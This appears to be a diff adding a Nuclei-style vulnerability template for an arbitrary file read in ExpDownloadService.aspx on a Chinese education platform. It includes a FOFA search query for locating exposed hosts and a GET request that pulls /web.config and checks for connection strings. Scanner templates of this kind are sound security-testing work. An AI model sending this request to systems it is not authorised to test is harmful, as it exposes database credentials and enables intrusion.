@@ -1,0 +1,25 @@
+id: smartedu-ExpDownloadService-fileread
+info:
+  name: EDU 智慧平台 ExpDownloadService.aspx - fileread
+  author: leadlife
+  severity: high
+  description: EDU某智慧平台ExpDownloadService.aspx任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/EDU/EDU%E6%9F%90%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0ExpDownloadService.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="custom/blue/uimaker/easyui.css"
+    hunter-query: demo
+  tags: smartedu,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ExpDownloadService.aspx?DownfilePath=/web.config"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'配置文件','connectionStrings')
+        condition: and
